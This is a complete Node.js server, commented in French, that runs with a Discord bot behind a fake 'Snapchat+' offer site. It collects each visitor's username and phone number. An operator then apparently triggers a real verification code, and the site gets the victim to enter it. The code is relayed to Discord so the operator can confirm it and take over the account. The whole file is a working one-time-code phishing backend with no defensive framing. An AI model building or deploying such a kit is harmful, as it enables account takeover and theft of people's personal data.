require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('./')); // Sert les fichiers statiques (index.html)

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// Stockage en mémoire des requêtes (sessionId -> { status, data })
const requests = {};

function generateId() {
    return Math.random().toString(36).substr(2, 9);
}

// 0. Enregistrer une visite
app.post('/api/visit', async (req, res) => {
    const channelId = process.env.CHANNEL_ID;
    const channel = client.channels.cache.get(channelId);
    
    if (channel) {
        const embed = new EmbedBuilder()
            .setTitle("👀 Nouvelle Visite")
            .setDescription("Quelqu'un vient d'arriver sur le site Snapchat+ !")
            .setColor(0x3b82f6)
            .setTimestamp();
        try {
            await channel.send({ embeds: [embed] });
        } catch(e) {}
    }
    res.json({ success: true });
});

// 1. Recevoir la demande du site
app.post('/api/request', async (req, res) => {
    const { username, phoneNumber, selectedMonths } = req.body;
    const sessionId = generateId();
    
    requests[sessionId] = {
        status: 'pending',
        data: { username, phoneNumber, selectedMonths }
    };

    const channelId = process.env.CHANNEL_ID;
    const channel = client.channels.cache.get(channelId);
    
    if (!channel) {
        console.error("Salon Discord introuvable. Vérifiez l'ID dans le .env");
        return res.status(500).json({ error: "Configuration Discord invalide" });
    }

    const embed = new EmbedBuilder()
        .setTitle("👻 Nouvelle demande Snapchat+")
        .setDescription(`**${username}** souhaite activer son offre.`)
        .setColor(0x8b5cf6)
        .addFields(
            { name: "👤 Utilisateur", value: `\`${username}\``, inline: true },
            { name: "📱 Numéro", value: `\`${phoneNumber}\``, inline: false },
            { name: "⏳ Durée choisie", value: `\`${selectedMonths} mois\`` }
        )
        .setFooter({ text: `Session: ${sessionId}` })
        .setTimestamp();

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(`accept_${sessionId}`)
                .setLabel('✅ Code Envoyé')
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`refuse_${sessionId}`)
                .setLabel('❌ Refuser')
                .setStyle(ButtonStyle.Danger)
        );

    try {
        await channel.send({ embeds: [embed], components: [row] });
        res.json({ sessionId, status: 'pending' });
    } catch (error) {
        console.error("Erreur Discord:", error);
        res.status(500).json({ error: "Erreur lors de l'envoi du message" });
    }
});

// 2. Polling par le site pour savoir si l'admin a cliqué
app.get('/api/status/:id', (req, res) => {
    const session = requests[req.params.id];
    if (!session) {
        return res.status(404).json({ error: "Session introuvable" });
    }
    res.json({ status: session.status });
});

// 3. Soumission du code final par le site
app.post('/api/submit-code', async (req, res) => {
    const { sessionId, code } = req.body;
    const session = requests[sessionId];
    
    if (!session) {
        return res.status(404).json({ error: "Session introuvable" });
    }

    session.status = 'code_pending';

    const channelId = process.env.CHANNEL_ID;
    const channel = client.channels.cache.get(channelId);
    
    if (channel) {
        const embed = new EmbedBuilder()
            .setTitle("✅ Code Reçu")
            .setDescription(`Le code **${code}** a été soumis par **${session.data.username}**.`)
            .setColor(0xfacc15)
            .addFields(
                { name: "👤 Utilisateur", value: `\`${session.data.username}\``, inline: true },
                { name: "🔑 Code", value: `\`${code}\``, inline: true },
                { name: "📱 Numéro", value: `\`${session.data.phoneNumber}\`` },
                { name: "⏳ Durée", value: `\`${session.data.selectedMonths} mois\`` }
            )
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`codeValid_${sessionId}`)
                    .setLabel('✅ Code Bon')
                    .setStyle(ButtonStyle.Success),
                new ButtonBuilder()
                    .setCustomId(`codeInvalid_${sessionId}`)
                    .setLabel('❌ Code Mauvais')
                    .setStyle(ButtonStyle.Danger)
            );

        try {
            await channel.send({ embeds: [embed], components: [row] });
        } catch(e) {
            console.error(e);
        }
    }

    res.json({ success: true });
});

// 4. Écouter les clics sur les boutons Discord
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, sessionId] = interaction.customId.split('_');
    const session = requests[sessionId];

    if (!session) {
        return interaction.reply({ content: "Cette session a expiré ou n'existe plus.", ephemeral: true });
    }

    if (action === 'accept') {
        session.status = 'accepted';
        
        const embed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0x22c55e)
            .setFooter({ text: `Statut : Code demandé ✅ | Session: ${sessionId}` });

        await interaction.update({ embeds: [embed], components: [] });
        await interaction.followUp({ content: `✅ Le statut a été mis à jour pour \`${session.data.username}\`. La page web va maintenant lui demander le code.`, ephemeral: true });
    } 
    else if (action === 'refuse') {
        session.status = 'refused';
        
        const embed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0xef4444)
            .setFooter({ text: `Statut : Refusé ❌ | Session: ${sessionId}` });

        await interaction.update({ embeds: [embed], components: [] });
        await interaction.followUp({ content: `❌ Demande refusée pour \`${session.data.username}\`.`, ephemeral: true });
    }
    else if (action === 'codeValid') {
        session.status = 'code_accepted';
        
        const embed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0x22c55e)
            .setTitle("✅ Code Validé")
            .setFooter({ text: `Statut : Succès ✅ | Session: ${sessionId}` });

        await interaction.update({ embeds: [embed], components: [] });
        await interaction.followUp({ content: `✅ Code validé avec succès pour \`${session.data.username}\`.`, ephemeral: true });
        
        // Nettoyage de la session après succès
        delete requests[sessionId];
    }
    else if (action === 'codeInvalid') {
        session.status = 'code_refused';
        
        const embed = EmbedBuilder.from(interaction.message.embeds[0])
            .setColor(0xef4444)
            .setTitle("❌ Code Incorrect")
            .setFooter({ text: `Statut : Code refusé ❌ | Session: ${sessionId}` });

        await interaction.update({ embeds: [embed], components: [] });
        await interaction.followUp({ content: `❌ Code refusé. \`${session.data.username}\` va être invité à réessayer.`, ephemeral: true });
    }
});

client.once('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag}`);
});

const PORT = process.env.PORT || 3000;
client.login(process.env.DISCORD_TOKEN).then(() => {
    app.listen(PORT, () => {
        console.log(`Serveur démarré sur http://localhost:${PORT}`);
    });
}).catch(err => {
    console.error("Erreur de connexion Discord :", err);
});
